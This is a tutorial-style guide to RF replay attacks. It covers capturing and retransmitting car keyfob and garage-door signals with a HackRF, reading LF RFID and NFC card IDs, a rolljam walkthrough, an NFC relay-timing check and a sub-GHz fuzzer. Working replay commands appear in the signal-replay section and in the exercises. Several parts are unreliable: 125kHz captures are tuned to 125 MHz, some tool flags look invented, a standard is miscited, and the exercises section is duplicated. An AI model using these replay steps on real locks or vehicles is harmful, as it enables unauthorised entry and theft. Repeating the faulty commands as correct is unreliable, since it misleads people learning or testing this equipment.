# RFID/RF Replay Attack Guide

## Introduction

Radio Frequency Identification (RFID) and radio-controlled devices use simple RF protocols that can be captured and analyzed with SDR equipment. These systems range from access control cards (125kHz LF RFID, 13.56MHz HF NFC) to automotive keyfobs (315/433/868MHz) and garage door openers. Many of these protocols were designed without strong security considerations, making them susceptible to replay attacks, cloning, and protocol manipulation.

Replay attacks work by capturing a legitimate signal transmission and retransmitting it at a later time. The effectiveness of this attack depends on whether the system uses fixed codes (vulnerable) or rolling codes (more resistant). Fixed-code systems transmit the same code every time, making them trivially vulnerable to replay. Rolling-code systems generate a new code for each transmission using a pseudorandom number generator synchronized between transmitter and receiver.

**Objectives**: Capture and analyze RFID/NFC signals, test for fixed-code vulnerabilities, perform signal replay attacks, and assess rolling code implementations.

## Low Frequency (125kHz) RFID

### LF RFID Signal Capture

Low frequency RFID operates at 125-134kHz and is commonly used for access control cards, animal tracking, and legacy building security systems. Most LF RFID cards use simple modulation schemes with no encryption.

```bash
# Capture LF RFID signal (requires appropriate antenna)
hackrf_transfer -r lf_rfid.raw -f 125000000 -s 8000000 -l 40 -g 30 -n 80000000

# Note: LF RFID at 125kHz requires special antenna or upconverter
# Direct 125kHz capture requires a dedicated LF antenna connected to HackRF

# Analyze LF RFID modulation with urh
urh -i lf_rfid.raw -f 125e3 -s 8e6 --demod ASK
```

### LF RFID Protocol Analysis

```bash
# Decode EM4100 protocol (common LF RFID format)
python3 -c "
import numpy as np
data = np.fromfile('lf_rfid.raw', dtype=np.complex64)
envelope = np.abs(data)
# EM4100 uses Manchester encoding at 64 cycles per bit
# Look for the header pattern: 9 consecutive 1s
print(f'Samples: {len(data)}, Peak: {np.max(envelope):.2f}')
"

# Extract card ID from EM4100 data
python3 -c "
# EM4100 format: 9 header bits + 10 row parity bits + 4 column parity + 1 stop bit
# Card ID is encoded in 32 data bits across 10 groups of 4 bits
def decode_em4100(bits):
    # Verify header (9 ones)
    header = bits[:9]
    if not all(b == 1 for b in header):
        return None
    # Extract data from 10 groups of 5 bits (4 data + 1 parity)
    card_id = 0
    for i in range(10):
        group = bits[9 + i*5 : 9 + i*5 + 5]
        data_bits = group[:4]
        parity = group[4]
        if sum(data_bits) % 2 != parity:
            return None
        if i < 8:
            card_id = (card_id << 4) | int(''.join(map(str, data_bits)), 2)
    return f'{card_id:010d}'
print('EM4100 decoder ready')
"
```

## High Frequency (13.56MHz) NFC

### NFC Signal Capture

HF NFC at 13.56MHz is used for contactless payment cards, access control, and smartphone-based NFC applications. These systems typically use more sophisticated protocols (ISO 14443, ISO 15693, FeliCa) with encryption support.

```bash
# Capture NFC signal with HackRF
hackrf_transfer -r hf_nfc.raw -f 13560000 -s 8000000 -l 40 -g 30 -n 80000000

# Analyze NFC signal with urh
urh -i hf_nfc.raw -f 13.56e6 -s 8e6

# NFC signal analysis with auto-demodulation
urh -i nfc_capture.complex16s -f 13.56e6 -s 2M --demod ASK
```

### NFC Protocol Analysis

```bash
# Extract UID from captured NFC signal
urh --decode nfc_capture.complex16s --protocol NFC

# Analyze ISO 14443 Type A communication
python3 -c "
import numpy as np
data = np.fromfile('hf_nfc.raw', dtype=np.complex64)
# ISO 14443-A uses 100% ASK for reader-to-card (PCD to PICC)
# Card-to-reader uses load modulation at 847.5kHz subcarrier
envelope = np.abs(data)
# Detect reader commands (large amplitude)
threshold = np.mean(envelope) + 3 * np.std(envelope)
peaks = np.where(envelope > threshold)[0]
print(f'Reader commands detected: {len(peaks) // 1000}')
print(f'UID extraction requires protocol-level decode')
"

# Check for NFC relay vulnerability
# Capture reader challenge and card response separately
# If timing is not enforced, relay attack may be possible
```

## Keyfob and Remote Control Replay

### Signal Capture

Most consumer remote controls (garage doors, car keyfobs, wireless doorbells) operate in the 315/433/868MHz ISM bands using simple OOK or FSK modulation.

```bash
# Capture keyfob signal at 315MHz (US/Japan)
hackrf_transfer -r keyfob_315.raw -f 315000000 -s 8000000 -l 40 -g 30

# Capture keyfob signal at 433MHz (Europe/Asia)
hackrf_transfer -r keyfob_433.raw -f 433920000 -s 8000000 -l 40 -g 30

# Capture garage door signal
hackrf_transfer -r garage.raw -f 390000000 -s 8000000 -l 40 -g 30

# Analyze captured signal with urh
urh -i keyfob_315.raw -f 315e6 -s 8e6 --auto-detect
```

### Rolling Code Analysis

```bash
# Capture multiple keyfob presses for rolling code analysis
for i in $(seq 1 5); do
  echo "Press button now (press $i of 5)..."
  hackrf_transfer -r "keyfob_press_${i}.raw" -f 315000000 -s 8000000 -l 40 -g 30 -n 80000000
  sleep 2
done

# Compare captures to identify rolling code patterns
python3 -c "
import numpy as np
for i in range(1, 6):
    data = np.fromfile(f'keyfob_press_{i}.raw', dtype=np.int8)
    # Extract digital bits from each capture
    envelope = np.abs(data.astype(float))
    threshold = np.mean(envelope) + 2*np.std(envelope)
    bits = (envelope > threshold).astype(int)
    # Look for differences between captures
    print(f'Press {i}: {len(data)} samples, signal bits: {np.sum(bits)}')
"

# Automatic protocol detection and comparison with urh
urh --compare keyfob_press_1.raw keyfob_press_2.raw keyfob_press_3.raw
```

### Signal Replay

```bash
# Replay captured fixed-code signal
hackrf_transfer -t keyfob_315.raw -f 315000000 -s 8000000 -x 40

# Replay with adjusted transmission power
hackrf_transfer -t keyfob_315.raw -f 315000000 -s 8000000 -x 20

# Replay garage door signal
hackrf_transfer -t garage.raw -f 390000000 -s 8000000 -x 30
```

## Weather Station and IoT Sensor Sniffing

### 433MHz Sensor Capture

Many consumer weather stations, power meters, and IoT sensors transmit unencrypted data at 433MHz using simple OOK modulation.

```bash
# Capture weather station data
hackrf_transfer -r weather.raw -f 433920000 -s 2000000 -l 40 -g 30 -n 20000000

# Continuous monitoring of sensor data
rtl_fm -f 433.92e6 -M raw -s 200k -g 30 - | \
  sox -t raw -r 200k -e unsigned -b 8 -c 1 - weather.wav

# Decode weather station protocol
urh -i weather.raw -f 433.92e6 -s 2e6 --demod OOK --bit-length 500
```

### Sensor Data Extraction

```bash
# Extract temperature and humidity data from captured signal
python3 -c "
import numpy as np
from scipy.signal import find_peaks

data = np.fromfile('weather.raw', dtype=np.complex64)
envelope = np.abs(data)

# Detect signal bursts
peaks, props = find_peaks(envelope, height=np.mean(envelope) + 3*np.std(envelope), distance=100)
print(f'Detected {len(peaks)} signal bursts')
for i, peak in enumerate(peaks[:10]):
    print(f'Burst {i}: sample {peak}, amplitude {envelope[peak]:.2f}')
"

# Scan for multiple sensor types
for freq in 433.42M 433.62M 433.92M 868.00M; do
  rtl_power -f ${freq} -i 1 -e 10 "sensor_${freq}.csv" 2>/dev/null
  awk -F, '$6 > -50 {print}' "sensor_${freq}.csv"
done
```

## Hands-on Exercises

### Exercise 1: LF RFID Card Reading

Capture and decode a 125kHz access card to extract the card ID number.

```bash
hackrf_transfer -r access_card.raw -f 125000000 -s 8000000 -l 40 -g 30 -n 80000000
urh -i access_card.raw -f 125e3 -s 8e6 --demod ASK
```

### Exercise 2: NFC Card Analysis

Capture and analyze a 13.56MHz NFC card communication to extract the UID and protocol type.

```bash
hackrf_transfer -r nfc_card.raw -f 13560000 -s 8000000 -l 40 -g 30 -n 80000000
urh -i nfc_card.raw -f 13.56e6 -s 8e6 --auto-detect
```

### Exercise 3: Keyfob Replay Test

Capture a keyfob signal and replay it to test for fixed-code vulnerability.

```bash
hackrf_transfer -r keyfob.raw -f 433920000 -s 8000000 -l 40 -g 30
urh -i keyfob.raw -f 433.92e6 -s 8e6 --auto-detect
hackrf_transfer -t keyfob.raw -f 433920000 -s 8000000 -x 40
```

### Exercise 4: Rolling Code Capture

Capture multiple keyfob transmissions and analyze them for rolling code patterns to determine if the system uses fixed or rolling codes.

```bash
for i in $(seq 1 5); do
  hackrf_transfer -r "press_${i}.raw" -f 315000000 -s 8000000 -l 40 -g 30 -n 80000000
done
urh --compare press_1.raw press_2.raw press_3.raw
```

## Practical Steps

### Step 1: Rolling Code Analysis Methodology

Rolling code systems use a pseudorandom number generator (PRNG) to produce a unique code for each transmission. The receiver maintains a synchronization window that accepts the next expected code and several future codes. Understanding the PRNG implementation is key to assessing rolling code security.

**Common Rolling Code Implementations:**

| System | Typical Code Length | Algorithm | Known Weaknesses |
|--------|--------------------|-----------|-----------------|
| KeeLoq | 32-bit rolling + 28-bit fixed | Nonlinear feedback shift register | Algebraic attack, side-channel key recovery |
| AES-based (modern) | 128-bit | AES-128 | Generally secure without implementation flaws |
| Hitag2 | 28-bit rolling | Proprietary cipher | Cryptanalytic breaks published |
| Nissan/Toyota | 40-bit | Custom PRNG | Rolling code capture + jamming attack |
| Garage (legacy) | 9-12 bit | Fixed code or simple counter | Trivially replayable |

```python
#!/usr/bin/env python3
"""Rolling code analysis framework for captured keyfob transmissions."""

import numpy as np
from collections import Counter

def extract_bit_sequence(iq_data, sample_rate, bit_rate, threshold_db=20):
    """Extract bit sequence from captured IQ data."""
    magnitude = np.abs(iq_data)

    # Detect signal bursts
    noise_floor = np.percentile(magnitude, 25)
    signal_threshold = noise_floor * (10 ** (threshold_db / 20))

    # Find signal start and end
    above = magnitude > signal_threshold
    transitions = np.diff(above.astype(int))
    starts = np.where(transitions == 1)[0]
    ends = np.where(transitions == -1)[0]

    if len(starts) == 0:
        return []

    # Ensure matching start/end pairs
    if len(ends) < len(starts):
        ends = np.append(ends, len(magnitude) - 1)

    bit_duration = int(sample_rate / bit_rate)
    sequences = []

    for s, e in zip(starts, ends):
        signal = magnitude[s:e]
        # Sample at bit centers
        num_bits = len(signal) // bit_duration
        bit_centers = np.arange(
            bit_duration // 2,
            num_bits * bit_duration,
            bit_duration
        )
        if len(bit_centers) > 0 and bit_centers[-1] < len(signal):
            bits = (signal[bit_centers] > signal_threshold).astype(int)
            sequences.append(''.join(map(str, bits)))

    return sequences

def analyze_rolling_codes(sequences):
    """Analyze multiple captured sequences for rolling code patterns."""
    if len(sequences) < 2:
        print('Need at least 2 captures for analysis')
        return

    min_len = min(len(s) for s in sequences)
    sequences = [s[:min_len] for s in sequences]

    print(f'Analyzing {len(sequences)} captures, each {min_len} bits')
    print()

    # Find static vs dynamic bit positions
    static_positions = []
    dynamic_positions = []

    for pos in range(min_len):
        bits_at_pos = [s[pos] for s in sequences]
        if len(set(bits_at_pos)) == 1:
            static_positions.append(pos)
        else:
            dynamic_positions.append(pos)

    print(f'Static positions: {len(static_positions)} (likely address/sync)')
    print(f'Dynamic positions: {len(dynamic_positions)} (likely rolling code/payload)')

    # Extract static portion (device identifier)
    static_part = ''.join(sequences[0][pos] for pos in static_positions)
    print(f'\nStatic portion: {static_part}')

    # Extract dynamic portions and look for patterns
    print(f'\nDynamic portion per capture:')
    dynamic_values = []
    for i, seq in enumerate(sequences):
        dynamic = ''.join(seq[pos] for pos in dynamic_positions)
        dynamic_values.append(int(dynamic, 2) if dynamic else 0)
        print(f'  Capture {i}: {dynamic} (decimal: {dynamic_values[-1]})')

    # Check for monotonic increase (counter-based rolling code)
    is_monotonic = all(dynamic_values[i] < dynamic_values[i+1]
                       for i in range(len(dynamic_values)-1))
    print(f'\nMonotonically increasing: {is_monotonic}')

    # Check for Hamming distance patterns
    if len(dynamic_values) >= 2:
        for i in range(len(dynamic_values)-1):
            diff = dynamic_values[i+1] ^ dynamic_values[i]
            hamming = bin(diff).count('1')
            print(f'  Hamming distance between capture {i} and {i+1}: {hamming} bits')

    return {
        'static_part': static_part,
        'dynamic_positions': dynamic_positions,
        'dynamic_values': dynamic_values,
        'is_counter_based': is_monotonic
    }

# Example analysis
print('Rolling Code Analysis Framework')
print('=' * 40)
print('Capture multiple keyfob presses, then analyze:')
print('  1. Are bits static or dynamic?')
print('  2. Is the dynamic portion a counter?')
print('  3. What is the code length?')
print('  4. Is the Hamming distance consistent?')
```

### Step 2: Signal Jamming and Capture-Resend Attack

The capture-resend (or rolljam) attack combines jamming with capture to intercept rolling codes without the receiver processing them, then resends them later. This is a conceptual description for understanding the attack surface.

```python
#!/usr/bin/env python3
"""
Conceptual rolljam attack framework for educational purposes.
This demonstrates the attack principle for security assessment only.

Attack concept:
1. Jam the receiver while capturing the first code
2. User presses again (code 2) because first press didn't work
3. Jam receiver while capturing code 2
4. Replay code 1 to open the device (still valid in sync window)
5. Attacker now has a valid unused code (code 2) for later use
"""

def conceptual_rolljam_framework():
    """Educational framework explaining the rolljam attack concept."""

    print("Rolljam Attack Concept (Educational)")
    print("=" * 50)
    print()
    print("Phase 1: Initial Capture")
    print("  - Attacker jams receiver frequency (433.92 MHz)")
    print("  - User presses keyfob -> Code 1 transmitted")
    print("  - Jamming prevents receiver from processing Code 1")
    print("  - Attacker SDR captures Code 1 successfully")
    print()
    print("Phase 2: Forced Second Transmission")
    print("  - User presses keyfob again (device didn't respond)")
    print("  - Attacker jams receiver frequency again")
    print("  - Code 2 transmitted and captured by attacker SDR")
    print("  - Receiver still hasn't processed any code")
    print()
    print("Phase 3: Code 1 Replay")
    print("  - Attacker replays Code 1 to receiver")
    print("  - Receiver accepts Code 1 (within sync window)")
    print("  - Device activates (door opens, etc.)")
    print()
    print("Phase 4: Future Access")
    print("  - Attacker retains Code 2 (valid, unused)")
    print("  - Attacker can replay Code 2 later for access")
    print()
    print("Limitations:")
    print("  - Requires precise jamming to avoid detection")
    print("  - Modern systems may use time-based validation")
    print("  - Some systems employ dual-code verification")
    print("  - Jamming is detectable and may trigger alarms")

conceptual_rolljam_framework()
```

### Step 3: Relay Attack Framework

Relay attacks extend the range of short-range wireless systems (NFC, passive keyless entry) by forwarding signals between the legitimate device and the verifier in real-time.

```python
#!/usr/bin/env python3
"""
NFC relay attack concept for security assessment.
Demonstrates the principle of extending NFC communication range.

Attack concept:
- Attacker A (near the card reader) captures reader challenges
- Attacker B (near the victim's card) forwards challenges to the card
- Card response is relayed back through B -> A -> reader
- If timing requirements allow, the reader accepts the response
"""

def nfc_relay_assessment():
    """Assessment framework for NFC relay vulnerability."""

    print("NFC Relay Attack Assessment")
    print("=" * 50)
    print()

    # NFC timing constraints
    protocols = {
        'ISO 14443-A': {
            'max_response_time_ms': 4.8,  # Frame waiting time
            'bit_rate_kbps': 106,
            'relay_feasible': True,
            'notes': 'Frame waiting time can be extended by reader implementation'
        },
        'ISO 14443-B': {
            'max_response_time_ms': 20,
            'bit_rate_kbps': 106,
            'relay_feasible': True,
            'notes': 'Longer timeout makes relay easier'
        },
        'NFC-DEP (LLCP)': {
            'max_response_time_ms': 201,
            'bit_rate_kbps': 424,
            'relay_feasible': True,
            'notes': 'Extended timeout for peer-to-peer mode'
        },
        'FeliCa': {
            'max_response_time_ms': 2.4,
            'bit_rate_kbps': 212,
            'relay_feasible': False,
            'notes': 'Very tight timing window, relay extremely difficult'
        }
    }

    for protocol, info in protocols.items():
        print(f'{protocol}:')
        print(f'  Max response time: {info["max_response_time_ms"]} ms')
        print(f'  Bit rate: {info["bit_rate_kbps"]} kbps')
        print(f'  Relay feasible: {info["relay_feasible"]}')
        print(f'  Notes: {info["notes"]}')
        print()

    print("Detection Methods:")
    print("  - Distance bounding (measure round-trip time)")
    print("  - Transaction velocity checks")
    print("  - Multi-factor verification")
    print("  - Relay-resistant protocols (FeliCa)")

nfc_relay_assessment()
```

### Step 4: Sub-GHz IoT Protocol Fuzzing

Many IoT devices in the sub-GHz ISM bands (315, 433, 868, 915 MHz) use custom or poorly documented protocols. Fuzzing these protocols can reveal vulnerabilities in the receiver implementation.

```python
#!/usr/bin/env python3
"""Sub-GHz IoT protocol fuzzer for authorized security testing."""

import numpy as np
import struct
import subprocess

def generate_ook_signal(bits, sample_rate, bit_duration_samples, freq_hz):
    """Generate OOK-modulated IQ signal from bit sequence."""
    signal = np.array([], dtype=np.complex64)

    for bit in bits:
        if bit == 1:
            # ON: generate carrier
            t = np.arange(bit_duration_samples)
            carrier = np.exp(2j * np.pi * freq_hz * t / sample_rate)
            signal = np.concatenate([signal, carrier])
        else:
            # OFF: silence
            signal = np.concatenate([signal, np.zeros(bit_duration_samples, dtype=np.complex64)])

    return signal

def fuzz_iot_protocol(base_bits, fuzz_positions, num_mutations):
    """Generate fuzzed variants of a captured protocol frame."""
    mutations = []

    for _ in range(num_mutations):
        mutated = list(base_bits)

        for pos in fuzz_positions:
            if pos < len(mutated):
                # Random bit flip
                import random
                if random.random() > 0.5:
                    mutated[pos] = 1 - mutated[pos]

                # Random byte substitution
                if random.random() > 0.8:
                    byte_start = (pos // 8) * 8
                    for b in range(min(8, len(mutated) - byte_start)):
                        mutated[byte_start + b] = random.randint(0, 1)

        mutations.append(mutated)

    return mutations

# Example: fuzz a captured 433 MHz IoT protocol frame
# Assume we captured a frame: preamble + sync + address + command + checksum
preamble = [1, 0, 1, 0] * 4  # Standard preamble
sync_word = [1, 1, 0, 0, 1, 1, 0, 0]  # Sync pattern
address = [0, 1, 1, 0, 0, 0, 1, 0]  # Device address
command = [1, 0, 0, 0, 0, 0, 0, 0]  # Command byte

base_frame = preamble + sync_word + address + command

# Fuzz the command byte (positions 24-31)
fuzzed = fuzz_iot_protocol(
    base_frame,
    fuzz_positions=range(24, 32),
    num_mutations=100
)

print(f'Base frame: {"".join(map(str, base_frame))}')
print(f'Generated {len(fuzzed)} fuzzed variants')
print(f'Fuzzing command byte positions 24-31')

# To transmit fuzzed frames using HackRF:
# Convert each mutation to IQ data, then use hackrf_transfer to transmit
for i, frame in enumerate(fuzzed[:5]):
    frame_str = ''.join(map(str, frame))
    print(f'  Mutation {i}: {frame_str}')
```

### Step 5: Advanced Signal Processing for Protocol Analysis

```python
#!/usr/bin/env python3
"""Advanced signal processing techniques for protocol reverse engineering."""

import numpy as np
from scipy.signal import find_peaks, hilbert

def preamble_detection(iq_data, sample_rate, preamble_pattern, bit_rate):
    """Detect preamble pattern in captured signal for frame synchronization."""
    bit_duration = int(sample_rate / bit_rate)
    magnitude = np.abs(iq_data)

    # Threshold to binary
    threshold = np.mean(magnitude) + 2 * np.std(magnitude)
    binary = (magnitude > threshold).astype(float)

    # Downsample to bit rate
    bit_centers = np.arange(bit_duration // 2, len(binary), bit_duration)
    bits = binary[bit_centers]

    # Slide preamble pattern over bit stream
    preamble = np.array(preamble_pattern, dtype=float)
    correlations = np.correlate(bits, preamble, mode='valid')
    norm = np.correlate(np.ones_like(bits), np.abs(preamble), mode='valid')
    correlations = correlations / (norm + 1e-12)

    # Find frame start positions
    threshold_corr = 0.8  # 80% match required
    peaks, properties = find_peaks(correlations, height=threshold_corr)

    frame_starts = bit_centers[peaks]
    frame_times = frame_starts / sample_rate

    print(f'Preamble pattern: {"".join(map(str, preamble_pattern))}')
    print(f'Frames detected: {len(peaks)}')
    for i, (start, time) in enumerate(zip(frame_starts, frame_times)):
        print(f'  Frame {i}: sample {start}, time {time:.6f}s')

    return frame_starts

def clock_recovery(iq_data, sample_rate):
    """Recover the symbol clock from a captured signal."""
    magnitude = np.abs(iq_data)

    # Use zero-crossing rate to estimate symbol rate
    # Apply envelope detection
    envelope = np.convolve(magnitude, np.ones(100) / 100, mode='same')

    # Find rising edges (transition from 0 to 1)
    threshold = np.mean(envelope) + np.std(envelope)
    binary = (envelope > threshold).astype(int)
    edges = np.diff(binary)
    rising_edges = np.where(edges == 1)[0]

    # Compute inter-edge intervals
    if len(rising_edges) > 2:
        intervals = np.diff(rising_edges)
        # Most common interval is the bit duration
        hist, bin_edges = np.histogram(intervals, bins=100)
        most_common_idx = np.argmax(hist)
        estimated_bit_duration = (bin_edges[most_common_idx] + bin_edges[most_common_idx + 1]) / 2
        estimated_bit_rate = sample_rate / estimated_bit_duration

        print(f'Clock Recovery Results:')
        print(f'  Rising edges detected: {len(rising_edges)}')
        print(f'  Estimated bit duration: {estimated_bit_duration:.0f} samples')
        print(f'  Estimated bit rate: {estimated_bit_rate:.0f} bps')
        print(f'  Symbol rate: {estimated_bit_rate:.0f} symbols/sec')

        return estimated_bit_rate, estimated_bit_duration

    return 0, 0

# Example usage with captured data
print('Advanced Protocol Analysis Framework')
print('=' * 50)
print('Capabilities:')
print('  1. Preamble detection for frame synchronization')
print('  2. Clock recovery for symbol rate estimation')
print('  3. Bit extraction and frame alignment')
print('  4. Pattern matching across multiple captures')
```

## Hands-on Exercises

### Exercise 1: LF RFID Card Reading

Capture and decode a 125kHz access card to extract the card ID number.

```bash
hackrf_transfer -r access_card.raw -f 125000000 -s 8000000 -l 40 -g 30 -n 80000000
urh -i access_card.raw -f 125e3 -s 8e6 --demod ASK
```

### Exercise 2: NFC Card Analysis

Capture and analyze a 13.56MHz NFC card communication to extract the UID and protocol type.

```bash
hackrf_transfer -r nfc_card.raw -f 13560000 -s 8000000 -l 40 -g 30 -n 80000000
urh -i nfc_card.raw -f 13.56e6 -s 8e6 --auto-detect
```

### Exercise 3: Keyfob Replay Test

Capture a keyfob signal and replay it to test for fixed-code vulnerability.

```bash
hackrf_transfer -r keyfob.raw -f 433920000 -s 8000000 -l 40 -g 30
urh -i keyfob.raw -f 433.92e6 -s 8e6 --auto-detect
hackrf_transfer -t keyfob.raw -f 433920000 -s 8000000 -x 40
```

### Exercise 4: Rolling Code Capture

Capture multiple keyfob transmissions and analyze them for rolling code patterns to determine if the system uses fixed or rolling codes.

```bash
for i in $(seq 1 5); do
  hackrf_transfer -r "press_${i}.raw" -f 315000000 -s 8000000 -l 40 -g 30 -n 80000000
done
urh --compare press_1.raw press_2.raw press_3.raw
```

### Exercise 5: IoT Protocol Fuzzing

Capture an IoT device signal, identify the frame structure, and generate fuzzed variants to test receiver robustness.

```bash
# Capture the IoT device signal
hackrf_transfer -r iot_device.raw -f 433920000 -s 2000000 -l 40 -g 30 -n 20000000
# Analyze with urh to identify frame structure
urh -i iot_device.raw -f 433.92e6 -s 2e6 --auto-detect
# Use the fuzzing framework to generate and transmit variants
python3 iot_fuzzer.py
```

### Exercise 6: NFC Relay Timing Assessment

Assess an NFC system's vulnerability to relay attacks by measuring the response time tolerance.

```bash
# Capture reader challenge and card response timing
hackrf_transfer -r nfc_timing.raw -f 13560000 -s 8000000 -l 40 -g 30 -n 80000000
python3 -c "
import numpy as np
data = np.fromfile('nfc_timing.raw', dtype=np.complex64)
magnitude = np.abs(data)
threshold = np.mean(magnitude) + 3 * np.std(magnitude)
bursts = np.where(magnitude > threshold)[0]
if len(bursts) > 1:
    intervals = np.diff(bursts[np.diff(bursts) > 100]) / 8e6 * 1000
    print(f'Inter-burst intervals (ms): {intervals[:10]}')
    print(f'Avg interval: {np.mean(intervals):.2f} ms')
    print(f'If avg > 5ms, relay attack may be feasible')
"
```

## References

- RTL-SDR RFID tutorials — https://www.rtl-sdr.com/tag/rfid/
- HackRF documentation — https://greatscottgadgets.com/hackrf/
- Universal Radio Hacker — https://github.com/jopohl/urh
- Proxmark3 documentation — https://github.com/RfidResearchGroup/proxmark3
- RFID security research — IOActive, Bishop Fox
- NFC security testing — NIST SP 800-121
- KeeLoq cryptanalysis — Bogdanov, Eisenbarth, et al.
- RollJam research — Samy Kamkar
- ISO 14443 specification — https://www.iso.org/standard/73599.html
- Relay attack research — Francis et al., "Practical NFC Relay Attack"
